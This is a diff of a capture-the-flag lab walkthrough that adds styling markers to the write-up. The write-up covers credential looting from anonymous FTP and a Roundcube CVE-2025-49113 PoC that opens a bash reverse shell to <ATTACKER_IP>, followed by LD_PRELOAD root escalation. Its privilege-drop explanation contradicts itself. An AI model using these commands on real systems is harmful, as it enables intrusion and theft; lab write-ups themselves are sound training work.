@@ -14,6 +14,7 @@ image:
 ```bash
 nmap -sC -sV -p21,8080 <TARGET_IP>
 ```
+{: .ms-4 }
 Anonymous FTP and Roundcube webmail on 8080.
 
 ## Phase 2 — Anonymous FTP → KeePass DB
@@ -24,10 +25,12 @@ Password: (blank)
 ftp> get creds.kdbx
 ftp> bye
 ```
+{: .ms-4 }
 Crack/open the KeePass DB (password: `abc123`):
 ```bash
 keepassxc-cli show creds.kdbx "Roundcube Login" -a Username -a Password
 ```
+{: .ms-4 }
 **Note:** Credentials: `www-data-mail / computer1`
 
 ## Phase 3 — Roundcube Login
@@ -35,6 +38,7 @@ keepassxc-cli show creds.kdbx "Roundcube Login" -a Username -a Password
 http://<TARGET_IP>:8080/roundcube/
 # login: www-data-mail / computer1
 ```
+{: .ms-4 }
 
 ## Phase 4 — CVE-2025-49113 Exploit
 Roundcube 1.6.10 is vulnerable to CVE-2025-49113, a post-auth PHP object injection in the `_from` parameter of the URL, leading to RCE. Use the public PoC:
@@ -42,12 +46,14 @@ Roundcube 1.6.10 is vulnerable to CVE-2025-49113, a post-auth PHP object injecti
 python3 CVE-2025-49113.py -u http://<TARGET_IP>:8080/roundcube/ \
  -c 'www-data-mail:computer1' --cmd 'bash -c "bash -i >& /dev/tcp/<ATTACKER_IP>/4444 0>&1"'
 ```
+{: .ms-4 }
 
 ## Phase 5 — Shell & User Flag
 ```bash
 nc -lvnp 4444
 cat /home/www-data/local.txt
 ```
+{: .ms-4 }
 
 ## Phase 6 — Privilege Escalation (LD_PRELOAD via SUID)
 A custom SUID binary exists at `/usr/local/bin/suidprog` that calls `system("/bin/bash")` after `setuid(0)`. Since it links libc dynamically and drops privileges before exec, check if `LD_PRELOAD` is honoured (it generally isn't for true SUID binaries unless `AT_SECURE` handling is broken — this lab's binary is intentionally exploitable):
@@ -64,12 +70,14 @@ EOF
 gcc -fPIC -shared -o /tmp/preload.so /tmp/preload.c -nostartfiles
 LD_PRELOAD=/tmp/preload.so /usr/local/bin/suidprog
 ```
+{: .ms-4 }
 **Note:** Because the binary is 4755 (SUID root) and doesn't drop the environment before invoking system(), `LD_PRELOAD` is inherited by the child shell.
 
 ## Phase 7 — Root Flag
 ```bash
 cat /root/proof.txt
 ```
+{: .ms-4 }
 
 ## Flags
 
